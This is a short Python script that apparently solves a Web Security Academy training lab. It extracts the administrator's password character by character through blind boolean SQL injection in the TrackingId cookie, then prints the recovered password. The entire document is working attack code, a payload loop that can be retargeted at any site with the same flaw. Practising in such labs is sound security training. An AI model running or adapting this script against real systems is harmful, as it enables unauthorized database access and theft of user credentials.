import requests
import string

url = "https://0a7300c4032e902f80cd713400270039.web-security-academy.net/filter?category=Accessories"
session_cookie = "52HNQ7hLKiHStFvJ64OyGgYhzYQbYcfh"

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

password = ""

for position in range(1, 21):
    found = False
    for char in charset:
        payload = (
            f"P8paY7W92GCaGVmI' AND SUBSTR((SELECT password FROM users "
            f"WHERE username='administrator'),{position},1)='{char}'--"
        )
        cookies = {"TrackingId": payload, "session": session_cookie}

        r = requests.get(url, cookies=cookies)

        if "Welcome back" in r.text:  
            password += char
            print(f"[+] Position {position}: Found '{char}' → {password}")
            found = True
            break
    if not found:
        print(f"[-] Position {position}: No match found (stopping early).")
        break

print(f"\n[✔] Extracted password: {password}")

